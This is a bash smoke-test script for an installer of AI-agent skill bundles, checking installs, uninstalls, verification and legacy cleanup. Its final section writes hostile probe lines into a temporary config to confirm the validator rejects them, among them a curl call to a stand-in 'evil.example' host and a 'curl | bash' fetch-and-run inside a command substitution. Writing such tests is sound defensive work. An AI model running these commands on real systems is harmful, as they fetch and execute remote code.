#!/usr/bin/env bash
# Smoke checks for install / uninstall / verify (bash 3.2+). Run from repo root:
#   ./tests/smoke.sh
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "$ROOT"
INSTALL="$ROOT/bin/install.sh"
UNINSTALL="$ROOT/bin/uninstall.sh"
VERIFY="$ROOT/bin/verify.sh"

FAIL=0
pass() { echo "PASS: $1"; }
fail() { echo "FAIL: $1"; FAIL=1; }

T="$(mktemp -d "${TMPDIR:-/tmp}/ar-smoke.XXXXXX")"
cleanup() { rm -rf "$T"; }
trap cleanup EXIT

# Isolate installs under a fake HOME so we never touch the real machine.
export HOME="$T"

"$INSTALL" --only cursor >/dev/null
[[ $? -eq 0 ]] && pass "exit 0 on success" || fail "exit 0 on success"
[[ -f "$HOME/.cursor/skills/atry-implement/SKILL.md" ]] && pass "cursor skill-folder" || fail "cursor skill-folder"

"$INSTALL" --only antigravity >/dev/null
[[ -f "$HOME/.gemini/config/skills/atry-implement/SKILL.md" ]] && pass ".gemini/config/skills" || fail ".gemini/config/skills"

"$INSTALL" --only claude >/dev/null
[[ -f "$HOME/.claude/skills/atry-implement/SKILL.md" ]] && pass "claude skill-folder" || fail "claude skill-folder"

"$INSTALL" --only codex >/dev/null
[[ -f "$HOME/.codex/skills/atry-implement/SKILL.md" ]] && pass "codex skill-folder" || fail "codex skill-folder"

# File-copy checks above only prove a file landed at the right path -- they
# do not prove the tool would actually load it as a skill. Check that every
# installed SKILL.md has well-formed front matter (a "---" fenced block with
# non-empty name: / description: fields), for every installed skill, under
# every tool directory. This mirrors what README calls out as a known gap
# ("install can succeed while the app ignores the files").
check_frontmatter() {
  local dir="$1" tool="$2"
  local f name desc skill_name
  for f in "$dir"/*/SKILL.md; do
    [[ -f "$f" ]] || continue
    skill_name="$(basename "$(dirname "$f")")"
    if [[ "$(sed -n '1p' "$f")" != "---" ]]; then
      fail "$tool/$skill_name frontmatter: missing opening ---"
      continue
    fi
    name="$(awk '/^---$/{c++; next} c==1 && /^name:[[:space:]]*/{sub(/^name:[[:space:]]*/,""); print; exit}' "$f")"
    desc="$(awk '/^---$/{c++; next} c==1 && /^description:[[:space:]]*/{sub(/^description:[[:space:]]*/,""); print; exit}' "$f")"
    if [[ -n "$name" && -n "$desc" ]]; then
      pass "$tool/$skill_name frontmatter"
    else
      fail "$tool/$skill_name frontmatter: empty or missing name:/description:"
    fi
  done
}

check_frontmatter "$HOME/.cursor/skills" "cursor"
check_frontmatter "$HOME/.gemini/config/skills" "antigravity"
check_frontmatter "$HOME/.claude/skills" "claude"
check_frontmatter "$HOME/.codex/skills" "codex"

# Legacy Cursor rules (.mdc) and Antigravity paths should be cleaned by uninstall
# (and by install migration) even after path/format change.
mkdir -p "$HOME/.cursor/rules" "$HOME/.agents/skills/atry-implement" "$HOME/.agent/skills/atry-implement"
echo legacy > "$HOME/.cursor/rules/atry-implement.mdc"
echo legacy > "$HOME/.agents/skills/atry-implement/SKILL.md"
echo legacy > "$HOME/.agent/skills/atry-implement/SKILL.md"

# Re-install cursor should migrate away the legacy .mdc
"$INSTALL" --only cursor --skill atry-implement >/dev/null
[[ ! -f "$HOME/.cursor/rules/atry-implement.mdc" ]] && pass "install cleans legacy mdc" || fail "install cleans legacy mdc"
# Recreate for uninstall coverage below
echo legacy > "$HOME/.cursor/rules/atry-implement.mdc"

if "$VERIFY" >/dev/null 2>&1; then pass "verify after install"; else fail "verify after install"; fi

# Skill bundles include references/ and scripts/ (not ~/.agent-relay/scripts/)
[[ -f "$HOME/.cursor/skills/atry-implement/references/file-conventions.md" ]] && \
  pass "bundle references" || fail "bundle references"
[[ -x "$HOME/.cursor/skills/atry-implement/scripts/task-claim.sh" ]] && \
  pass "bundle task-claim" || fail "bundle task-claim"
[[ -x "$HOME/.cursor/skills/atry-implement/scripts/task-init.sh" ]] && \
  pass "bundle task-init" || fail "bundle task-init"
[[ -x "$HOME/.cursor/skills/atry-self-review/scripts/review-section.sh" ]] && \
  pass "bundle review-section" || fail "bundle review-section"
[[ -f "$HOME/.cursor/skills/atry-plan/SKILL.md" ]] && pass "atry-plan installed" || fail "atry-plan installed"
[[ ! -e "$HOME/.agent-relay/scripts/task-claim.sh" ]] && \
  pass "no legacy global scripts" || fail "no legacy global scripts"

# Legacy ~/.agent-relay/scripts is cleaned on install
mkdir -p "$HOME/.agent-relay/scripts"
echo old > "$HOME/.agent-relay/scripts/task-claim.sh"
"$INSTALL" --only cursor >/dev/null
[[ ! -e "$HOME/.agent-relay/scripts/task-claim.sh" ]] && \
  pass "install cleans legacy scripts" || fail "install cleans legacy scripts"

"$INSTALL" --dry-run --only CURSOR >/dev/null
pass "--only CURSOR"

if "$INSTALL" --dry-run --only nosuch >/dev/null 2>&1; then fail "unknown tool"; else pass "unknown tool"; fi
if "$INSTALL" --dry-run --skill nosuch >/dev/null 2>&1; then fail "unknown skill"; else pass "unknown skill"; fi

out="$("$INSTALL" --dry-run --only "cursor, antigravity" 2>/dev/null)" \
  || true
echo "$out" | grep -q ANTIGRAVITY && pass "comma+space" || fail "comma+space"

# Description with apostrophe must survive skill-folder bundle copy.
DESC="$T/apos-src"
mkdir -p "$DESC/skills/apos-test/references"
cp "$INSTALL" "$DESC/install.sh"
cp "$ROOT/targets.conf" "$DESC/"
cp "$ROOT/lib/bootstrap.sh" "$DESC/lib/bootstrap.sh" 2>/dev/null || {
  mkdir -p "$DESC/lib"
  cp "$ROOT/lib/bootstrap.sh" "$DESC/lib/bootstrap.sh"
}
printf '%s\n' '---' 'name: apos-test' "description: Review the user's implementation." '---' '' '# Body' > "$DESC/skills/apos-test/SKILL.md"
cp "$ROOT/docs/file-conventions.md" "$DESC/skills/apos-test/references/file-conventions.md"
(
  export HOME="$DESC/out"
  mkdir -p "$HOME"
  cd "$DESC"
  bash ./install.sh --only cursor --skill apos-test
) >/dev/null
grep -q "user's implementation" "$DESC/out/.cursor/skills/apos-test/SKILL.md" && pass "apostrophe" || fail "apostrophe"
[[ -f "$DESC/out/.cursor/skills/apos-test/references/file-conventions.md" ]] && \
  pass "apos bundle references" || fail "apos bundle references"

echo MARKER >> "$HOME/.cursor/skills/atry-implement/SKILL.md"
"$INSTALL" --only cursor --skill atry-implement --no-clobber >/dev/null
grep -q MARKER "$HOME/.cursor/skills/atry-implement/SKILL.md" && pass "no-clobber" || fail "no-clobber"

if "$INSTALL" --only cursor --dry-run 2>&1 | grep -q -- '--target'; then
  fail "--target rejected"
else
  # Explicit rejection when --target is passed
  if "$INSTALL" --target /tmp/x >/dev/null 2>&1; then fail "--target rejected"; else pass "--target rejected"; fi
fi

"$UNINSTALL" --only cursor --skill atry-implement >/dev/null
[[ ! -e "$HOME/.cursor/skills/atry-implement" ]] && pass "uninstall cursor skill" || fail "uninstall cursor skill"
[[ ! -f "$HOME/.cursor/rules/atry-implement.mdc" ]] && pass "uninstall legacy mdc" || fail "uninstall legacy mdc"
# Other cursor skills should remain
[[ -f "$HOME/.cursor/skills/atry-self-review/SKILL.md" ]] && pass "uninstall scoped" || fail "uninstall scoped"

if "$VERIFY" --only cursor --skill atry-implement >/dev/null 2>&1; then
  fail "verify fail after partial uninstall"
else
  pass "verify fail after partial uninstall"
fi

"$UNINSTALL" >/dev/null
[[ ! -f "$HOME/.gemini/config/skills/atry-implement/SKILL.md" ]] && pass "uninstall all" || fail "uninstall all"
[[ ! -e "$HOME/.claude/skills/atry-implement" ]] && pass "uninstall claude skill" || fail "uninstall claude skill"
[[ ! -e "$HOME/.codex/skills/atry-implement" ]] && pass "uninstall codex skill" || fail "uninstall codex skill"
[[ ! -e "$HOME/.agents/skills/atry-implement" ]] && pass "uninstall legacy .agents" || fail "uninstall legacy .agents"
[[ ! -e "$HOME/.agent/skills/atry-implement" ]] && pass "uninstall legacy .agent" || fail "uninstall legacy .agent"
[[ ! -e "$HOME/.agent-relay/scripts/task-claim.sh" ]] && pass "uninstall scripts" || fail "uninstall scripts"

# validate_targets_conf: allowlist accepts the real manifest and benign paths
# that contain "source"/"exec" as substrings; rejects bare commands and
# VAR=value cmd forms that a keyword blocklist previously missed.
# shellcheck source=lib/bootstrap.sh
source "$ROOT/lib/bootstrap.sh"
if validate_targets_conf "$ROOT/targets.conf"; then
  pass "validate_targets_conf accepts real targets.conf"
else
  fail "validate_targets_conf accepts real targets.conf"
fi
CONF_PROBE="$T/targets-probe.conf"
printf 'FOO_DIR="$HOME/.resource/skills"\n' > "$CONF_PROBE"
if validate_targets_conf "$CONF_PROBE"; then
  pass "validate_targets_conf allows path containing resource"
else
  fail "validate_targets_conf allows path containing resource"
fi
printf 'CURSOR_DIR="$HOME/.cursor/skills"\ncurl http://evil.example/x\n' > "$CONF_PROBE"
if validate_targets_conf "$CONF_PROBE" >/dev/null 2>&1; then
  fail "validate_targets_conf rejects bare command line"
else
  pass "validate_targets_conf rejects bare command line"
fi
printf 'CURSOR_DIR=/tmp bash -c evil\n' > "$CONF_PROBE"
if validate_targets_conf "$CONF_PROBE" >/dev/null 2>&1; then
  fail "validate_targets_conf rejects VAR=value cmd"
else
  pass "validate_targets_conf rejects VAR=value cmd"
fi
printf 'EVIL="$(curl http://x | bash)"\n' > "$CONF_PROBE"
if validate_targets_conf "$CONF_PROBE" >/dev/null 2>&1; then
  fail "validate_targets_conf rejects command substitution"
else
  pass "validate_targets_conf rejects command substitution"
fi

if [[ "$FAIL" -eq 0 ]]; then
  echo "ALL SMOKE TESTS PASSED"
else
  echo "SOME FAILURES"
  exit 1
fi
